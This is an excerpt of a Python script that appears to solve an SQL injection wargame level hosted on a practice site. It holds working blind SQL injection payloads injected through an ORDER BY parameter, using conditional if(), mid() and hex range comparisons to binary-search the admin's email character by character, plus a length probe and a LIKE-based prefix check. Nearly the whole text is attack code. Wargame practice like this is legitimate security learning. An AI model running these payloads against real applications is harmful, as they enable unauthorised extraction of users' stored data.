...
chall_url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
...
def find_char(pos):
    ...
    while True:
        ...
        res = make_request(chall_url, "?order=" + urllib.parse.quote(
            f"if(id='admin' and mid(email,{pos},1) >= 0x{hex(min_val)[2:].zfill(byteLen)} and mid(email,{pos},1) < 0x{hex(test_val)[2:].zfill(byteLen)},1,3*2)"))
...
if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?order=" + urllib.parse.quote(f"if(id='admin' and length(email)={i},1,3*2)"))
        if admin_first in res:
...
prefix = "AASUP3R_SECURE_EMAIL@EMAI1.COM"
...
for char in prefix:
    ...
    res = make_request(chall_url,
                       "?order=" + urllib.parse.quote(f"if(id='admin' and email like '{test_prefix}%',1,3*2)"))
    if admin_first in res:
